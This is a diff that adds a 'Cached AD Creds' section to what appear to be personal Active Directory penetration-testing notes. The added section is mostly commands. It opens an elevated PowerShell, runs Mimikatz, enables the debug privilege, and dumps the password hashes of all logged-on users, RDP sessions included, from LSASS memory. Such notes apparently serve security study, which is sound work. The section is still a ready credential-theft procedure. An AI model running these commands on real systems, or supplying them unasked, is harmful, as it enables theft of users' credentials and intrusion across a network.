@@ -46,3 +46,21 @@ the name of service of granted access, session key for use between client and se
 
 ## Cached AD Creds
 
+Hashes are stored in LSASS memory space (We need System or local admin to gain access)
+
+
+Launch Elevated Shell
+Powershell: Start-Process powershell -Verb RunAs
+CMD: powershell -Command "Start-Process powershell -Verb RunAs"
+
+Mimikatz
+.\mimikatz.exe
+
+
+Engage SeDebugPrivlege
+privilege::debug
+
+dump creds of all logged-on users.
+This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
+
+sekurlsa::logonpasswords
